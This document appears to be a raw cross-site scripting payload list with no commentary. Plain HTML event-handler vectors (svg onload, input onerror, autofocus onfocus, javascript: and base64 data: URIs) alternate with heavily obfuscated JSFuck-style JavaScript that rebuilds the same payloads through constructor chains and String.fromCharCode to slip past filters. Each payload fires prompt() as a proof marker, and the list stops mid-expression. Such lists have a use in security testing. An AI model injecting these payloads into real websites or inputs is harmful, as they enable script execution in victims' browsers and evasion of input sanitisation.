[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg %09onload%20=prompt(329)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload%09%20%28%2C%3B=prompt(331)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload%0B=prompt(333)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg/onload=prompt(335)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg//////onload=prompt(337)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg id=x;onload=prompt(339)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg id=`x`onload=prompt(341)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<body onoload=prompt(343)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<input type=image src=x:x onerror=prompt(345)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<isindex onmouseover="prompt(347)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[3]+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form oninput=prompt(349)><input></form>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<textarea autofocus onfocus=prompt(351)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+(false+"")[1]+(true+"")[1]+(true+"")[3]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<input oncut=prompt(353)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[3]+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload=prompt(355)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<keygen autofocus onfocus=prompt(357)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[2]+(true+"")[3]+(undefined+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<video><source onerror="prompt(359)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[10]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<marquee onstart=prompt(361)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+(true+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[3]+(true+"")[0]+(false+"")[1]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<a href="javascript:prompt(363)">show</a>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<a href='data:text/html,base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>show</a>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form action="javascript:prompt(367)"><button>send</button></form>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+(false+"")[1]+([false]+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return 